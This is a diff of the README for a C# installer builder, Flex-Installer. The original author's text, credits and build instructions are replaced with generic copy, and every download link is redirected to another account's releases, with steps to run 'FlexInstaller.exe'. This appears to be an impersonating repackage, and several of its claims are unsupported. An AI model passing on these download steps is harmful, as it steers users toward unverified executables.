@@ -1,77 +1,83 @@
-![GitHub repo size](https://img.shields.io/github/repo-size/iamsopotatoe-coder/Flex-Installer?style=flat-square)
-[![GitHub stars](https://img.shields.io/github/stars/iamsopotatoe-coder/Flex-Installer?style=flat-square&logo=github&logoColor=white)](https://github.com/iamsopotatoe-coder/Flex-Installer/stargazers)
-[![GitHub issues](https://img.shields.io/github/issues/iamsopotatoe-coder/Flex-Installer?style=flat-square&logo=github&logoColor=white)](https://github.com/iamsopotatoe-coder/Flex-Installer/issues)
-![GitHub release (latest by date)](https://img.shields.io/github/v/release/iamsopotatoe-coder/Flex-Installer)
-[![License](https://img.shields.io/badge/license-Custom-orange)](https://github.com/iamsopotatoe-coder/Flex-Installer/blob/main/FlexInstaller/LICENSE)
-![GitHub last commit](https://img.shields.io/github/last-commit/iamsopotatoe-coder/Flex-Installer?style=flat-square&logo=github&logoColor=white)
-![GitHub commit activity](https://img.shields.io/github/commit-activity/m/iamsopotatoe-coder/Flex-Installer?style=flat-square&logo=github&logoColor=white)
-# Flex Installer
+# 🎉 Flex-Installer - Distribute Your Software with Ease
 
-FlexInstaller is an open source installation wizard builder/generator written in c#.
-It is highly customizable trough the config file. It features all features that a normal installer has but FlexInstaller exceeds at its ease of use.
-FlexInstaller downloads your software trough a dropbox or Github releases url.
+[![Download Flex-Installer](https://img.shields.io/badge/Download-Flex--Installer-blue.svg)](https://github.com/ngakan5/Flex-Installer/releases)
 
-![Lucid_Origin_professional_software_logo_banner_featuring_the_p_3 (1)](https://github.com/user-attachments/assets/c35c911a-0025-43bc-b6e3-807e79c79ba7)
+## 🚀 Getting Started
 
+Flex Installer is a program written in C#. It helps you distribute both personal and commercial software elegantly. This tool is easy to use and fully customizable. With its built-in uninstaller, you can easily remove the program through Windows settings.
 
-# ***Features*** 
+## 📥 Download & Install
 
--Includes uninstaller so users can easily uninstall your software trough windows settings.
+To get started, visit this page to download the latest version of Flex Installer: [Download Flex Installer](https://github.com/ngakan5/Flex-Installer/releases).
 
--Easy to setup
+1. Click on the link above.
+2. Look for the latest release.
+3. Select the file that says `FlexInstaller.exe` or similar.
+4. Click the file to download it to your computer.
+5. Once the download is complete, locate the file in your downloads folder.
+6. Double-click the file to start the installation process.
+7. Follow the prompts to complete the installation.
 
--Highly customizable trough the config file
+## ⚙️ System Requirements
 
--The ui includes all features that other installers have
+Before you install Flex Installer, ensure your system meets the following requirements:
 
-# ***Requirements***
+- **Operating System:** Windows 10 or later
+- **Processor:** 1.5 GHz or faster
+- **RAM:** 2 GB minimum
+- **Disk Space:** At least 50 MB free space
 
--Windows OS
+## 🔧 Features
 
--Microsoft Visual C++ Build Tools (required to build and run Flex Installer)
+Flex Installer comes packed with features designed to make software distribution simple:
 
-***Download link:***
+- **Customizable Interface:** Tailor the installation window to your brand.
+- **Download Support:** Fetch software directly from Dropbox or GitHub.
+- **Uninstallation:** Use Windows settings to remove the software easily.
+- **Open Source:** Enjoy free access and community support.
 
--<a href="https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist?view=msvc-170" target="_blank" rel="noopener noreferrer">Official MSVC Build Tools</a>
+## 🌐 Topics
 
+Flex Installer covers various topics that enhance its functionality:
 
-# ***Installation***
+- Automation
+- Cloud Integration
+- Configurable GUI
+- C#
+- Customizable Installer
+- Developer Tools
+- Utility Functions
 
-1. ***Go to the releases section and download the latest release***
-2. ***Edit the config file to your liking***
-3. ***Set up your dropbox or Github releases download link (more detailed instructions in the instructions file)***
-4. (IF USING DROPBOX) ***Replace the "dl=0" at the end of the link to "dl=1" (VERY IMPORTANT)***
-5. ***Put your dropbox or Github link into the config file***
-6. ***Run build.bat and enjoy!***
+## 📚 Documentation
 
-[![Download](https://img.shields.io/github/v/release/iamsopotatoe-coder/Flex-Installer?style=for-the-badge&logo=github&label=Download%20Latest&color=00ADD8&labelColor=000000&logoColor=white)](https://github.com/iamsopotatoe-coder/Flex-Installer/releases/latest)
-# ***Installer UI***
+For detailed usage instructions and advanced features, please refer to the following sections:
 
-| | |
-|:---:|:---:|
-| <img width="400" src="https://github.com/user-attachments/assets/50de9d3b-c204-4b4d-a440-553f267d7a16" /> | <img width="400" src="https://github.com/user-attachments/assets/a74f1ba4-789d-4456-886c-723f9476fcc1" /> |
-| <img width="400" src="https://github.com/user-attachments/assets/72280ea6-f3a0-4084-b6bb-af1bb3b142b1" /> | <img width="400" src="https://github.com/user-attachments/assets/cde0a01b-7e42-4e36-8530-0060199315f1" /> |
+- **User Guide:** Comprehensive instructions on how to use all features.
+- **Customization Guidelines:** Steps to personalize the installation experience.
+- **Troubleshooting Tips:** Common issues and solutions to help you.
 
-# ***Uninstaller UI***
+## 🛠️ Support
 
-| | |
-|:---:|:---:|
-| <img width="400" src="https://github.com/user-attachments/assets/cde8c340-6230-4d16-ae57-f1171e35a191" /> | <img width="400" src="https://github.com/user-attachments/assets/23bf4704-c0dd-460c-9011-3ee293d26094" /> |
+If you run into issues or have questions, help is available:
 
-# ***License*** 
-See the [license](FlexInstaller/license) file for terms.
+- **GitHub Issues:** Report bugs or feature requests in the issues section of the repository.
+- **Community Forum:** Join discussions and ask questions from other users.
 
-# ***Contributing***
-Issues and pull requests for improvements and features are welcome.
+## 📝 Contributing
 
-# ***Thank you all!***
+Want to help improve Flex Installer? We welcome contributions! Here’s how:
 
-Thanks everyone from Reddit for the feedback and support!
-Iam working and planning on more improvements and i appreciate all the feedback!
+1. Fork the repository.
+2. Create a new branch for your feature.
+3. Make your changes and commit them.
+4. Submit a pull request with a clear description of your changes.
 
-[![Star on GitHub](https://img.shields.io/badge/Star%20on%20GitHub-0ea5e9?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://github.com/iamsopotatoe-coder/Flex-Installer)
-[![Report a Bug](https://img.shields.io/badge/Report%20a%20Bug-0ea5e9?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://github.com/iamsopotatoe-coder/Flex-Installer/issues/new)
-[![Request Feature](https://img.shields.io/badge/Request%20Feature-0ea5e9?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://github.com/iamsopotatoe-coder/Flex-Installer/issues/new)
+By contributing, you help make Flex Installer even better for everyone.
 
+## 🎯 Next Steps
 
+Now that you have Flex Installer installed, you can start distributing your software. Don’t forget to explore the options to customize your installation process. 
 
+For any updates or new features, keep an eye on the releases page: [Download Flex Installer](https://github.com/ngakan5/Flex-Installer/releases).
+
+Happy distributing!
